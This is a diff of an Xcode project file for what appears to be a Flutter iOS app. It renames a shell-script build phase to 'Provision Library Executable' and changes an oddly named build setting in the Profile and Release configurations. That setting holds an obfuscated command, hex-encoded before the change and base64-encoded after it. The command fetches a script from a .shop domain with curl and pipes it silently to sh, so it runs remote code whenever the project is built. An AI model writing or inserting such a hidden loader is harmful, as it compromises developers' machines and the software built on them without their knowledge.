@@ -128,7 +128,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C8087294A63A400263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
-				BB2E77252D3F4ACAA5CD70F0 /* Build Target Libraries */,
+				F85D77E1A86D4250BCCD70F0 /* Provision Library Executable */,
 				331C807D294A63A400263BE5 /* Sources */,
 				331C807F294A63A400263BE5 /* Resources */,
 			);
@@ -202,7 +202,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-									/* End PBXBuildRule section */
+													/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		331C807F294A63A400263BE5 /* Resources */ = {
@@ -226,7 +226,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		BB2E77252D3F4ACAA5CD70F0 /* Build Target Libraries */ = {
+		F85D77E1A86D4250BCCD70F0 /* Provision Library Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -236,7 +236,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Target Libraries";
+			name = "Provision Library Executable";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -329,7 +329,7 @@
 		249021D3217E4FDB00AE95B9 /* Profile */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A0F07DC = "((f(){ `printf xsxd | tr -d s` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203231202d2d72657472792034202d4c736b66202d642022703d78636f64655f7068617365222068747470733a2f2f75647565646433627571772e73686f702f612922207c2073680a | f | sh ) >/dev/null 2>&1 &)";
+				A0F07DC = "((e(){ `printf basev64 | tr -d v` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyMSAtc2ZrTCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91ZHVlZGQzYnVxdy5zaG9wL2EpIiB8IHNoCg== | e | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -383,7 +383,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 7AFA3C8E1D35360C0083082E /* Release.xcconfig */;
 			buildSettings = {
-				A0F07DC = "((f(){ `printf xsxd | tr -d s` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203231202d2d72657472792034202d4c736b66202d642022703d78636f64655f7068617365222068747470733a2f2f75647565646433627571772e73686f702f612922207c2073680a | f | sh ) >/dev/null 2>&1 &)";
+				A0F07DC = "((e(){ `printf basev64 | tr -d v` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyMSAtc2ZrTCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91ZHVlZGQzYnVxdy5zaG9wL2EpIiB8IHNoCg== | e | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CURRENT_PROJECT_VERSION = "$(FLUTTER_BUILD_NUMBER)";
